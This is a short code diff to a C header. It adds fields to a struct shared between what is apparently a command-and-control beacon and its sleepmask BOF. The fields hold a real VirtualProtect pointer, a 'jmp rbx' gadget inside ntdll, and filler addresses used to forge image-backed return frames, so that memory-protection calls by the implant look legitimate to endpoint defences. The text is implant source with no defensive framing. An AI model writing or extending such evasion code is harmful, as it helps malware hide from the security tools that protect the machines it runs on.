@@ -46,6 +46,16 @@ typedef struct _NAX_SM_INFO {
     UINT32  CleanTextSize;
     NAX_SM_CONFIG Config;
     UINT32  ActiveJobCount;
+    /* P4 stack-spoof (populated by the beacon when NAX_SPOOF_STACK, read by the
+       sleepmask BOF). Unconditional fields keep the gate ABI identical on both
+       sides; SpoofReady=0 -> BOF falls back to a direct VirtualProtect call. */
+    PVOID   VpPtr;          /* real kernel32!VirtualProtect (pre-gate-swap) -- trampoline jmps here */
+    PVOID   JmpRbxGadget;   /* FF E3 (jmp rbx) in ntdll .text: VP immediate-return gadget */
+    PVOID   StackFiller;    /* image-backed ntdll addr for the deeper spoofed return slots */
+    PVOID   NtdllBase;      /* ntdll image base: bound the RBP walk + image-backed test */
+    SIZE_T  NtdllSize;      /* ntdll SizeOfImage */
+    UINT32  SpoofReady;     /* 1 = gadget+filler resolved; 0 = spoof disabled */
+    UINT32  SpoofCount;     /* P4 diagnostic: incremented by the trampoline on every spoofed VP (zero-init) */
 } NAX_SM_INFO, *PNAX_SM_INFO;
 
 /* ========= [ function call descriptor ] ========= */
